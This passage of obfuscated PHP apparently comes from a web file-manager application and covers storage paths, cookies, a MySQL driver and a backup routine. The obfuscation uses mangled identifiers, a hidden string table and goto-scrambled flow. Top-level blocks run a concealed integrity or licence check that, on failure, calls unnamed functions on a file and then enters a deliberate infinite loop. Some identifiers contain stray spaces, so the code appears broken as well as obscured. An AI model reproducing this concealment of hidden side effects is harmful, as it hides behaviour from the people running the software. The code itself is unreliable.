$d•†®¥áà” = 250) { if (strstr($this->endpoint, $_SERVER[¬ˆÚÂ”Éğä][1253])) { return parent::fileOutImageServer($CçŒ¾±Œ, $d•†®¥áà”); } parent::fileOutImage($CçŒ¾±Œ, $d•†®¥áà”); } public function fileOutLink($b–™Š£ñÇ¢) { $cß¥…œâ«ã =& $_SERVER[¬ˆÚÂ”Éğä]; if (substr($b–™Š£ñÇ¢, 0, 7) == $cß¥…œâ«ã[1128]) { $b–™Š£ñÇ¢ = $cß¥…œâ«ã[1129] . substr($b–™Š£ñÇ¢, 7); } header($cß¥…œâ«ã[156] . $b–™Š£ñÇ¢); die; } public function getHost() { $cÜÂ¬Â¯ï =& $_SERVER[¬ˆÚÂ”Éğä]; $C·´²¤ÑÍ = str_rtrim(parent::getHost(), $cÜÂ¬Â¯ï[8] . $this->bucket); $C·´²¤ÑÍ = explode($cÜÂ¬Â¯ï[171], $C·´²¤ÑÍ); return $C·´²¤ÑÍ[0] . $cÜÂ¬Â¯ï[171] . $this->bucket . $cÜÂ¬Â¯ï[91] . $C·´²¤ÑÍ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fÖİŒË†Ü‡, $F’¡´ï‚ = 0) { parent::__construct(); $this->source = $fÖİŒË†Ü‡; $this->sourceSize = $F’¡´ï‚; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A¤š“­–Ì× = false) { return $this->sourceSize; } public function getContent($C¢îÏÛ‰˜Ÿ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[¬ˆÚÂ”Éğä][33]; } $aÑ³ùƒ‹îÛ = ftell($this->source); $DÚÅÊã„ä× = @fread($this->source, $this->sourceSize); fseek($this->source, $aÑ³ùƒ‹îÛ); return $DÚÅÊã„ä×; } } public function fileSubstr($b‹ø±„øŠ = false, $e»œ„†½ŸÃ = 0, $Aª…ë‹å¬ñ = 0) { if (!$Aª…ë‹å¬ñ) { $Aª…ë‹å¬ñ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $e»œ„†½ŸÃ, $Aª…ë‹å¬ñ); } if ($this->sourceType == self::TYPE_FILE) { if ($Aª…ë‹å¬ñ <= 0) { return $_SERVER[¬ˆÚÂ”Éğä][33]; } $DçÙ±Œ‡õÊ = ftell($this->source); fseek($this->source, $DçÙ±Œ‡õÊ + $e»œ„†½ŸÃ); $FŞ‹…æºøñ = @fread($this->source, $Aª…ë‹å¬ñ); fseek($this->source, $DçÙ±Œ‡õÊ); return $FŞ‹…æºøñ; } } public function hashMd5($DãÅ´ÜÖ† = false) { return md5($this->getContent()); } public static function hash($béœğè…Õ, $dç…®¨òÔ¦ = 0) { $Eİ¾­ÂçÁÕ = new PathDriverStream($béœğè…Õ, $dç…®¨òÔ¦); return $Eİ¾­ÂçÁÕ->hashSimple($béœğè…Õ); } public static function md5($fƒŸ¢Úöº›, $b©·Œø—‡§ = 0) { $c··¬ƒöŸ‹ = new PathDriverStream($fƒŸ¢Úöº›, $b©·Œø—‡§); return $c··¬ƒöŸ‹->hashMd5($fƒŸ¢Úöº›); } } goto f˜®Œ¥ö°; DÇ®­ÓìŒ­: $FÔä¤¨ÒàË = LIB_DIR . $_SERVER[¬ˆÚÂ”Éğä][2239]; $f¥°‰¹„Í¶ = $_SERVER[¬ˆÚÂ”Éğä][803]; if ($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][785]] != $f¥°‰¹„Í¶($FÔä¤¨ÒàË)) { goto e©Ø‰ÎÑ«; e©Ø‰ÎÑ«: $aôÊ±’î» = $_SERVER[¬ˆÚÂ”Éğä][787]; $cİÜÖ„ = $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]; $BÔÚâ„ÊËŒ = $aôÊ±’î»($cİÜÖ„); goto dã„®ï“ã; a´ŒËºè: $DÉ°…¸ê¶´($FÔä¤¨ÒàË); goto Dù’Ìæ‹×¡; dã„®ï“ã: $aŞáÒÍ„ÊÊ = explode($_SERVER[¬ˆÚÂ”Éğä][217], $BÔÚâ„ÊËŒ); if (count($aŞáÒÍ„ÊÊ) < $_SERVER[¬ˆÚÂ”Éğä][567]) { $eÚåáâ¦“ = $_SERVER[¬ˆÚÂ”Éğä][790]; $eÚåáâ¦“(); } $DÉ°…¸ê¶´ = $_SERVER[¬ˆÚÂ”Éğä][791]; goto a´ŒËºè; Dù’Ìæ‹×¡: } goto Bİß‡ôóå; c³¿¹Ãß”â: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($fÉ¼œšêÁé = '', $D´Äµê = 0) { if (is_string($fÉ¼œšêÁé) && $fÉ¼œšêÁé != $_SERVER[¬ˆÚÂ”Éğä][33]) { $this->prefix = $fÉ¼œšêÁé; } if (is_numeric($D´Äµê) && $D´Äµê > 0) { $this->expire = $D´Äµê; } } public static function getInstance() { static $Fáõ™í‡´£; if ($Fáõ™í‡´£ === null) { $Fáõ™í‡´£ = new self(); } return $Fáõ™í‡´£; } private static $sameCookieSet = array(); public static function set($Fó‚æ¤ª–, $fÖàËó¿ç§, $fñƒ÷“…·é = 0, $FŠ´÷ÊøÓ = false, $eˆÙ©Â‘†ù = false) { goto A‡ï×§Èõ; A‡ï×§Èõ: $d§˜ÊØ‰§å =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$fñƒ÷“…·é) { $fñƒ÷“…·é = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Fó‚æ¤ª–]) && self::$sameCookieSet[$Fó‚æ¤ª–] == $fÖàËó¿ç§ . $fñƒ÷“…·é) { return; } goto Eâ¶¼øó©; Eâ¶¼øó©: self::$sameCookieSet[$Fó‚æ¤ª–] = $fÖàËó¿ç§ . $fñƒ÷“…·é; if (!$eˆÙ©Â‘†ù) { $eˆÙ©Â‘†ù = str_replace(HOST, $d§˜ÊØ‰§å[33], APP_HOST); $eˆÙ©Â‘†ù = _get($GLOBALS, $d§˜ÊØ‰§å[809], $eˆÙ©Â‘†ù); } $e¿Ğ°çºãĞ = $d§˜ÊØ‰§å[33]; goto a£™ÇÇ…ˆí; a£™ÇÇ…ˆí: setcookie($Fó‚æ¤ª–, $fÖàËó¿ç§, time() + $fñƒ÷“…·é, $d§˜ÊØ‰§å[8] . trim($eˆÙ©Â‘†ù, $d§˜ÊØ‰§å[8]) . $e¿Ğ°çºãĞ, !1, !1, $FŠ´÷ÊøÓ); goto cã»²ø–ÜØ; cã»²ø–ÜØ: } public static function setSafe($Eæ¨×Å„Ö², $EÓ¢äÛ´‡, $F¹ëîÅ‘ = 0) { self::set($Eæ¨×Å„Ö², $EÓ¢äÛ´‡, $F¹ëîÅ‘, !0); } public static function get($d†Ù´Î¾ª) { return isset($_COOKIE[$d†Ù´Î¾ª]) ? $_COOKIE[$d†Ù´Î¾ª] : !1; } public static function remove($DÔšà°Ù¸è, $cİïÕîÒ = false) { unset($_COOKIE[$DÔšà°Ù¸è]); self::set($DÔšà°Ù¸è, $_SERVER[¬ˆÚÂ”Éğä][33], 1, $cİïÕîÒ); } } if (!isset($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][785]]) || !isset($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][792]])) { goto fÅÎÎÙ”ïÀ; fÅÎÎÙ”ïÀ: $aôÊ±’î» = $_SERVER[¬ˆÚÂ”Éğä][787]; $cİÜÖ„ = $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]; $BÔÚâ„ÊËŒ = $aôÊ±’î»($cİÜÖ„); goto aàƒøÅÒ¢ª; DÉÛ‡ØÙÏ: $DÉ°…¸ê¶´($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]); $Dù¼ÙÃåˆÌ = 2; while ($Dù¼ÙÃåˆÌ > 1) { $e”Âé®É¿” = rawurlencode($Dù¼ÙÃåˆÌ . $_SERVER[¬ˆÚÂ”Éğä][361]); } goto c±ŒÑÉ±Æ¸; aàƒøÅÒ¢ª: $aŞáÒÍ„ÊÊ = explode($_SERVER[¬ˆÚÂ”Éğä][217], $BÔÚâ„ÊËŒ); if (count($aŞáÒÍ„ÊÊ) < $_SERVER[¬ˆÚÂ”Éğä][567]) { $eÚåáâ¦“ = $_SERVER[¬ˆÚÂ”Éğä][790]; $eÚåáâ¦“(); } $DÉ°…¸ê¶´ = $_SERVER[¬ˆÚÂ”Éğä][791]; goto DÉÛ‡ØÙÏ; c±ŒÑÉ±Æ¸: } class DbMysql extends Db { public function __construct($AÈ°·ŒÊÈŞ = '') { $BôËŸâå–ë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!extension_loaded($BôËŸâå–ë[735])) { think_exception(think_lang($BôËŸâå–ë[10]) . $BôËŸâå–ë[810]); } if (!empty($AÈ°·ŒÊÈŞ)) { $this->config = $AÈ°·ŒÊÈŞ; if (empty($this->config[$BôËŸâå–ë[13]])) { $this->config[$BôËŸâå–ë[13]] = $BôËŸâå–ë[33]; } } } public function connect($EÇßø¶ôé¿ = '', $EºìËÕè÷â = 0, $féÍóê¿¸Ş = false) { $DÃàÃÏì =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->linkID[$EºìËÕè÷â])) { goto còö‹ë×¿; cõ¬‰Ï’º÷: if ($D”¥¢ªØëë) { $this->linkID[$EºìËÕè÷â] = mysql_pconnect($AÁé…Òæœ¡, $EÇßø¶ôé¿[$DÃàÃÏì[813]], $EÇßø¶ôé¿[$DÃàÃÏì[814]], 131072); } else { $this->linkID[$EºìËÕè÷â] = mysql_connect($AÁé…Òæœ¡, $EÇßø¶ôé¿[$DÃàÃÏì[813]], $EÇßø¶ôé¿[$DÃàÃÏì[814]], !0, 131072); } if (!$this->linkID[$EºìËÕè÷â] || !empty($EÇßø¶ôé¿[$DÃàÃÏì[17]]) && !mysql_select_db($EÇßø¶ôé¿[$DÃàÃÏì[17]], $this->linkID[$EºìËÕè÷â])) { think_exception(mysql_error()); } $Aé´²œ„À = mysql_get_server_info($this->linkID[$EºìËÕè÷â]); goto b¸…ŠŸÒî; b¸…ŠŸÒî: mysql_query($DÃàÃÏì[815] . think_config($DÃàÃÏì[816]) . $DÃàÃÏì[55], $this->linkID[$EºìËÕè÷â]); if ($Aé´²œ„À > $DÃàÃÏì[817]) { mysql_query($DÃàÃÏì[818], $this->linkID[$EºìËÕè÷â]); } $this->connected = !0; goto aØ…«¥‘…ç; còö‹ë×¿: if (empty($EÇßø¶ôé¿)) { $EÇßø¶ôé¿ = $this->config; } $AÁé…Òæœ¡ = $EÇßø¶ôé¿[$DÃàÃÏì[811]] . ($EÇßø¶ôé¿[$DÃàÃÏì[812]] ? "\x3a{$EÇßø¶ôé¿[$DÃàÃÏì[812]]}" : $DÃàÃÏì[33]); $D”¥¢ªØëë = !empty($EÇßø¶ôé¿[$DÃàÃÏì[13]][$DÃàÃÏì[14]]) ? $EÇßø¶ôé¿[$DÃàÃÏì[13]][$DÃàÃÏì[14]] : $this->pconnect; goto cõ¬‰Ï’º÷; aØ…«¥‘…ç: if (1 != think_config($DÃàÃÏì[18])) { unset($this->config); } goto F¥ÜÎ¾’; F¥ÜÎ¾’: } return $this->linkID[$EºìËÕè÷â]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($AÀÅàª£õî) { goto AìáªÑÏš‘; b´ˆê’¢Ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto e‹‰¶…š§‘; cí„Éï™‡Ò: think_action_status($f®Äá»Œè[19], 1); think_status($f®Äá»Œè[20]); $this->queryID = mysql_query($AÀÅàª£õî, $this->_linkID); goto b´ˆê’¢Ò; AìáªÑÏš‘: $f®Äá»Œè =& $_SERVER[¬ˆÚÂ”Éğä]; if (0 === stripos($AÀÅàª£õî, $f®Äá»Œè[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto a‡Å·±íÜ; a‡Å·±íÜ: if (!$this->_linkID) { return !1; } $this->queryStr = $AÀÅàª£õî; if ($this->queryID) { $this->free(); } goto cí„Éï™‡Ò; e‹‰¶…š§‘: } public function execute($Eí”Ÿ¹õÉİ) { goto a¯¹Î†Å×¾; b¨Õ”Û‰ÚÔ: $this->queryStr = $Eí”Ÿ¹õÉİ; if ($this->queryID) { $this->free(); } think_action_status($e³·öå‡Å×[21], 1); goto aÉ”îÜ­; a¯¹Î†Å×¾: $e³·öå‡Å× =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b¨Õ”Û‰ÚÔ; b¦Æ¢®âÏ: if (!1 === $fŒôÌ¸¸’·) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d™š¡²ÎêÙ; aÉ”îÜ­: think_status($e³·öå‡Å×[20]); $fŒôÌ¸¸’· = mysql_query($Eí”Ÿ¹õÉİ, $this->_linkID); $this->debug(); goto b¦Æ¢®âÏ; d™š¡²ÎêÙ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¬ˆÚÂ”Éğä][819], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cì ¬÷öàª = mysql_query($_SERVER[¬ˆÚÂ”Éğä][820], $this->_linkID); $this->transTimes = 0; if (!$cì ¬÷öàª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÜÀ®ùêŒ¡ = mysql_query($_SERVER[¬ˆÚÂ”Éğä][821], $this->_linkID); $this->transTimes = 0; if (!$BÜÀ®ùêŒ¡) { $this->error(); return !1; } } return !0; } private function getAll() { $fÆ°ƒ…–œô = array(); if ($this->numRows > 0) { while ($fÒ—Ñ‰¶²ä = mysql_fetch_assoc($this->queryID)) { $fÆ°ƒ…–œô[] = $fÒ—Ñ‰¶²ä; } mysql_data_seek($this->queryID, 0); } return $fÆ°ƒ…–œô; } public function getFields($F»“—èä«) { $Bî‚‹ÉÃ‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $D²õ³³“ŒÖ = $this->query($Bî‚‹ÉÃ‘[822] . $this->parseKey($F»“—èä«)); $B²—ø¥×Ì¯ = array(); if ($D²õ³³“ŒÖ) { foreach ($D²õ³³“ŒÖ as $aù£±•ôêÔ => $AÜõåÓƒìó) { $B²—ø¥×Ì¯[$AÜõåÓƒìó[$Bî‚‹ÉÃ‘[27]]] = array($Bî‚‹ÉÃ‘[28] => $AÜõåÓƒìó[$Bî‚‹ÉÃ‘[27]], $Bî‚‹ÉÃ‘[29] => $AÜõåÓƒìó[$Bî‚‹ÉÃ‘[30]], $Bî‚‹ÉÃ‘[31] => (bool) (strtoupper($AÜõåÓƒìó[$Bî‚‹ÉÃ‘[32]]) === $Bî‚‹ÉÃ‘[823]), $Bî‚‹ÉÃ‘[34] => $AÜõåÓƒìó[$Bî‚‹ÉÃ‘[35]], $Bî‚‹ÉÃ‘[36] => strtolower($AÜõåÓƒìó[$Bî‚‹ÉÃ‘[37]]) == $Bî‚‹ÉÃ‘[38], $Bî‚‹ÉÃ‘[39] => strtolower($AÜõåÓƒìó[$Bî‚‹ÉÃ‘[40]]) == $Bî‚‹ÉÃ‘[41]); } } return $B²—ø¥×Ì¯; } public function getTables($b¬ìØ¤‚ùÆ = '') { $eÚ÷½÷§ÅÍ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($b¬ìØ¤‚ùÆ)) { $a¿ÍÀ‰ªº = $eÚ÷½÷§ÅÍ[824] . $b¬ìØ¤‚ùÆ; } else { $a¿ÍÀ‰ªº = $eÚ÷½÷§ÅÍ[825]; } $fê›í¤ê»› = $this->query($a¿ÍÀ‰ªº); $A©¾ÔÒ·• = array(); foreach ($fê›í¤ê»› as $e†Ä¬İ ùê => $fÓƒä“‹Ëº) { $A©¾ÔÒ·•[$e†Ä¬İ ùê] = current($fÓƒä“‹Ëº); } return $A©¾ÔÒ·•; } public function replace($fãÂ§Ààøï, $FĞÎ¥Ä¾À¾ = array()) { $D—ğßø®Öë =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($fãÂ§Ààøï as $EŠÕ±òåÓø => $d†²»¾”®Œ) { $dâø”Ô¼ºª = $this->parseValue($d†²»¾”®Œ); if (is_scalar($dâø”Ô¼ºª)) { $cµ×éğ—å[] = $dâø”Ô¼ºª; $fñ„¢®ÊÉ[] = $this->parseKey($EŠÕ±òåÓø); } } $cÆ•Ş¥ãêŒ = $D—ğßø®Öë[826] . $this->parseTable($FĞÎ¥Ä¾À¾[$D—ğßø®Öë[267]]) . $D—ğßø®Öë[827] . implode($D—ğßø®Öë[47], $fñ„¢®ÊÉ) . $D—ğßø®Öë[828] . implode($D—ğßø®Öë[47], $cµ×éğ—å) . $D—ğßø®Öë[829]; return $this->execute($cÆ•Ş¥ãêŒ); } public function insertAll($bô‘Ïòàãæ, $B«˜–±ïÏ = array(), $D½¦ƒ¯ÂÖ = false) { goto Bˆîœ¢¤…ä; CïÑêåğàÄ: $EÂÄÛó©ªÉ = array(); foreach ($bô‘Ïòàãæ as $F—Şã‹ñòË) { $a‚¬¹Äª = array(); foreach ($F—Şã‹ñòË as $aà§êµ’ƒ˜ => $A¨Ü³È£) { $A¨Ü³È£ = $this->parseValue($A¨Ü³È£); if (is_scalar($A¨Ü³È£)) { $a‚¬¹Äª[] = $A¨Ü³È£; } } $EÂÄÛó©ªÉ[] = $dĞ‚èƒÙ­[248] . implode($dĞ‚èƒÙ­[47], $a‚¬¹Äª) . $dĞ‚èƒÙ­[829]; } array_walk($BŸ·–¢ë¤, array($this, $dĞ‚èƒÙ­[830])); goto F›ù¿íŒÒË; Bˆîœ¢¤…ä: $dĞ‚èƒÙ­ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_array($bô‘Ïòàãæ[0])) { return !1; } $BŸ·–¢ë¤ = array_keys($bô‘Ïòàãæ[0]); goto CïÑêåğàÄ; F›ù¿íŒÒË: $cåùÔÛê» = ($D½¦ƒ¯ÂÖ ? $dĞ‚èƒÙ­[831] : $dĞ‚èƒÙ­[832]) . $dĞ‚èƒÙ­[833] . $this->parseTable($B«˜–±ïÏ[$dĞ‚èƒÙ­[267]]) . $dĞ‚èƒÙ­[827] . implode($dĞ‚èƒÙ­[47], $BŸ·–¢ë¤) . $dĞ‚èƒÙ­[834] . implode($dĞ‚èƒÙ­[47], $EÂÄÛó©ªÉ); return $this->execute($cåùÔÛê»); goto eøì÷éÅ à; eøì÷éÅ à: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $aÉæ‘ÏËã =& $_SERVER[¬ˆÚÂ”Éğä]; $this->error = mysql_errno() . $aÉæ‘ÏËã[4] . mysql_error($this->_linkID); if ($aÉæ‘ÏËã[33] != $this->queryStr) { $this->error .= LNG($aÉæ‘ÏËã[45]) . $this->queryStr; } think_trace($this->error, $aÉæ‘ÏËã[33], $aÉæ‘ÏËã[46]); return $this->error; } public function escapeString($dÀ¾İôø¥) { if ($this->_linkID) { return mysql_real_escape_string($dÀ¾İôø¥, $this->_linkID); } else { return mysql_escape_string($dÀ¾İôø¥); } } public function parseKey(&$eÌ·ºëê³, $e†–ôëµé¾ = true) { $a½‰šÏ‡„‹ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($e†–ôëµé¾) { $eÌ·ºëê³ = $this->parseKeyCheck($eÌ·ºëê³); } if ($eÌ·ºëê³ != $a½‰šÏ‡„‹[176] && !preg_match($a½‰šÏ‡„‹[835], $eÌ·ºëê³)) { $eÌ·ºëê³ = $a½‰šÏ‡„‹[836] . trim($eÌ·ºëê³, $a½‰šÏ‡„‹[836]) . $a½‰šÏ‡„‹[836]; } return $eÌ·ºëê³; } } goto Eâ…‘¿´í‰; bÍÁ§‰¥©: class BackupFile { public function __construct() { } public function index() { goto EíÁ÷ß¢ÁŒ; cÇøÁîƒ·õ: $D”‰ˆÆœ = !0; $eì‹ë¸º = $this->storeIds(); $c”†¤ç•æ§ = 1; goto bµØÆ²Ï…ª; bµØÆ²Ï…ª: $F¥ø§¸µ® = 1000; $cÑ©Ê´ß½¶ = $Eä¡Ü¨‡˜¿ = 0; $e®˜š™å»ğ = array(); goto F ®Œ´›Å°; D¡í•™ø‚õ: $aÈ±ÑˆŒ©› = $D”‰ˆÆœ ? 1 : 0; $f‚½Œ‹ÚàÙ = array($_SERVER[¬ˆÚÂ”Éğä][758] => 1, $_SERVER[¬ˆÚÂ”Éğä][449] => time(), $_SERVER[¬ˆÚÂ”Éğä][716] => $aÈ±ÑˆŒ©›, $_SERVER[¬ˆÚÂ”Éğä][755] => $F¼Ç ˜«æ‘, $_SERVER[¬ˆÚÂ”Éğä][747] => $càä©å§ÅÛ, $_SERVER[¬ˆÚÂ”Éğä][746] => $F‚´Ôõ…ù); if ($Eä¡Ü¨‡˜¿) { $f‚½Œ‹ÚàÙ[$_SERVER[¬ˆÚÂ”Éğä][756]] = $dªôÌ½–ƒ; $f‚½Œ‹ÚàÙ[$_SERVER[¬ˆÚÂ”Éğä][757]] = $aœŠÄø¥—‡; } goto E­‹³Í¯£; Eâ§ĞÆ’ŒŸ: $c‰¦§¶šæà->task[$_SERVER[¬ˆÚÂ”Éğä][706]] = $càä©å§ÅÛ; $f‚½Œ‹ÚàÙ = array($_SERVER[¬ˆÚÂ”Éğä][746] => $F‚´Ôõ…ù, $_SERVER[¬ˆÚÂ”Éğä][747] => $càä©å§ÅÛ); Backup::set($f‚½Œ‹ÚàÙ); goto cÇøÁîƒ·õ; EíÁ÷ß¢ÁŒ: $C¬ç‘ª©ù¡ = Backup::get(); $F¼Ç ˜«æ‘ = $C¬ç‘ª©ù¡[$_SERVER[¬ˆÚÂ”Éğä][281]][$_SERVER[¬ˆÚÂ”Éğä][167]][$_SERVER[¬ˆÚÂ”Éğä][419]]; $fŞËÀ©ªÔ¶ = array($_SERVER[¬ˆÚÂ”Éğä][420] => array($_SERVER[¬ˆÚÂ”Éğä][742], $F¼Ç ˜«æ‘), $_SERVER[¬ˆÚÂ”Éğä][743] => array($_SERVER[¬ˆÚÂ”Éğä][319], $C¬ç‘ª©ù¡[$_SERVER[¬ˆÚÂ”Éğä][699]])); goto D¾æªÅ¯Ñ; D¾æªÅ¯Ñ: $F‚´Ôõ…ù = (int) Model($_SERVER[¬ˆÚÂ”Éğä][726])->where($fŞËÀ©ªÔ¶)->count($_SERVER[¬ˆÚÂ”Éğä][419]); $càä©å§ÅÛ = (int) Model($_SERVER[¬ˆÚÂ”Éğä][726])->where($fŞËÀ©ªÔ¶)->sum($_SERVER[¬ˆÚÂ”Éğä][77]); $c‰¦§¶šæà = new TaskFileTransfer($_SERVER[¬ˆÚÂ”Éğä][744], $_SERVER[¬ˆÚÂ”Éğä][721], $F‚´Ôõ…ù, LNG($_SERVER[¬ˆÚÂ”Éğä][722]) . $_SERVER[¬ˆÚÂ”Éğä][723] . LNG($_SERVER[¬ˆÚÂ”Éğä][745])); goto Eâ§ĞÆ’ŒŸ; F ®Œ´›Å°: $aœŠÄø¥—‡ = $dªôÌ½–ƒ = 0; do { $c×¶ÔçÛ»‰ = $_SERVER[¬ˆÚÂ”Éğä][748]; $f¯ÃÖ½‡´Ã = Model($_SERVER[¬ˆÚÂ”Éğä][726])->where($fŞËÀ©ªÔ¶)->field($c×¶ÔçÛ»‰)->order($_SERVER[¬ˆÚÂ”Éğä][749])->selectPage($F¥ø§¸µ®, $c”†¤ç•æ§); $eÍÎŠ÷ËêÜ = !empty($f¯ÃÖ½‡´Ã[$_SERVER[¬ˆÚÂ”Éğä][354]]) ? $f¯ÃÖ½‡´Ã[$_SERVER[¬ˆÚÂ”Éğä][354]] : array(); foreach ($eÍÎŠ÷ËêÜ as $d´¸·é•æ) { goto cè­ŞÁ¶Ê; fä”À–àÑ: if (IO::exist($bÎÂ†§ÈÌ”)) { $c‰¦§¶šæà->updateFileEnd($d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][28]], $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][77]]); } else { $bÎÂ†§ÈÌ” = get_path_father($bÎÂ†§ÈÌ”); IO::mkdir($bÎÂ†§ÈÌ”); if (!IO::copy($eŒË¤Ò¶Ç, $bÎÂ†§ÈÌ”, $_SERVER[¬ˆÚÂ”Éğä][752])) { write_log($_SERVER[¬ˆÚÂ”Éğä][753] . $eŒË¤Ò¶Ç . $_SERVER[¬ˆÚÂ”Éğä][754] . $bÎÂ†§ÈÌ” . $_SERVER[¬ˆÚÂ”Éğä][478], $_SERVER[¬ˆÚÂ”Éğä][721]); $D”‰ˆÆœ = !1; break; } } $F¼Ç ˜«æ‘ = $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][419]]; $Eä¡Ü¨‡˜¿ += 1; goto Bó«±îë; cè­ŞÁ¶Ê: if (!$this->_fileExist($d´¸·é•æ, $e®˜š™å»ğ, $eì‹ë¸º)) { $F‚´Ôõ…ù -= 1; $càä©å§ÅÛ -= (int) $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][77]]; write_log("\146\x69\x6c\x65\x20\x6e\157\164\40\145\x78\x69\x73\164\x2e\x66\x69\154\145\111\x44\x3a{$d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][419]]}\54\x20\x70\x61\164\150\72{$d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][75]]}", $_SERVER[¬ˆÚÂ”Éğä][750]); continue; } $eŒË¤Ò¶Ç = $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][75]]; $bÎÂ†§ÈÌ” = "\x7b\151\x6f\72{$C¬ç‘ª©ù¡[$_SERVER[¬ˆÚÂ”Éğä][699]]}\175" . substr($eŒË¤Ò¶Ç, strlen("\173\x69\157\72{$d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][751]]}\x7d")); goto fä”À–àÑ; Bó«±îë: $cÑ©Ê´ß½¶ += $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][77]]; $dªôÌ½–ƒ += 1; $aœŠÄø¥—‡ += $d´¸·é•æ[$_SERVER[¬ˆÚÂ”Éğä][77]]; goto Aä¥¸³×°†; Aä¥¸³×°†: if ($cÑ©Ê´ß½¶ >= 1024 * 1024 * 100) { $f‚½Œ‹ÚàÙ = array($_SERVER[¬ˆÚÂ”Éğä][755] => $F¼Ç ˜«æ‘, $_SERVER[¬ˆÚÂ”Éğä][756] => $dªôÌ½–ƒ, $_SERVER[¬ˆÚÂ”Éğä][757] => $aœŠÄø¥—‡); Backup::set($f‚½Œ‹ÚàÙ); $cÑ©Ê´ß½¶ = $Eä¡Ü¨‡˜¿ = 0; } goto a¨‡ İ¯ØÇ; a¨‡ İ¯ØÇ: } $Bªà‚åîö© = count($eÍÎŠ÷ËêÜ); $c”†¤ç•æ§++; } while ($Bªà‚åîö© == $F¥ø§¸µ®); $c‰¦§¶šæà->end(); goto D¡í•™ø‚õ; E­‹³Í¯£: Backup::set($f‚½Œ‹ÚàÙ); $this->_fileFilter($e®˜š™å»ğ); return !0; goto c’ÁÀ…“º—; c’ÁÀ…“º—: } private function _fileExist($Cêø™¨ßº”, &$BË½ê”ÈÁÀ, $F¦ô­İƒä) { goto B­êÍÇÏÈ³; eì‡Ï†¬ßÌ: if (!in_array($Cêø™¨ßº”[$e×¤ì§Ç‹Ú[751]], $F¦ô­İƒä)) { return !1; } if (IO::exist($fèõÒ¤ÄßÄ)) { return !0; } $dåôùÄ‰ó = get_path_father($fèõÒ¤ÄßÄ); goto d‡Îíñ½ ñ; B­êÍÇÏÈ³: $e×¤ì§Ç‹Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $fèõÒ¤ÄßÄ = $Cêø™¨ßº”[$e×¤ì§Ç‹Ú[75]]; if (in_array($Cêø™¨ßº”[$e×¤ì§Ç‹Ú[419]], $BË½ê”ÈÁÀ)) { return !1; } goto eì‡Ï†¬ßÌ; eğ¨õÅŞ­: $BË½ê”ÈÁÀ = array_merge($BË½ê”ÈÁÀ, array_to_keyvalue($FÆáœ™ëó¦, $e×¤ì§Ç‹Ú[33], $e×¤ì§Ç‹Ú[419])); return !1; goto b«Íš‡ƒ²¼; d‡Îíñ½ ñ: if (IO::exist($dåôùÄ‰ó)) { $BË½ê”ÈÁÀ[] = $Cêø™¨ßº”[$e×¤ì§Ç‹Ú[419]]; return !1; } $eÁäÇ¢ƒä´ = array($e×¤ì§Ç‹Ú[751] => $Cêø™¨ßº”[$e×¤ì§Ç‹Ú[751]], $e×¤ì§Ç‹Ú[75] => array($e×¤ì§Ç‹Ú[759], "{$dåôùÄ‰ó}\45")); $FÆáœ™ëó¦ = Model($e×¤ì§Ç‹Ú[726])->where($eÁäÇ¢ƒä´)->field($e×¤ì§Ç‹Ú[420])->select(); goto eğ¨õÅŞ­; b«Íš‡ƒ²¼: } private function _fileFilter($EÓøå«ò) { $dŠ®èÄ»Š… =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($EÓøå«ò)) { return; } $cÜ»á•‡ = array($dŠ®èÄ»Š…[419] => array($dŠ®èÄ»Š…[7], array_unique($EÓøå«ò))); $fáÆâ“®Œ„ = Model($dŠ®èÄ»Š…[760])->where($cÜ»á•‡)->field($dŠ®èÄ»Š…[369])->select(); foreach ($fáÆâ“®Œ„ as 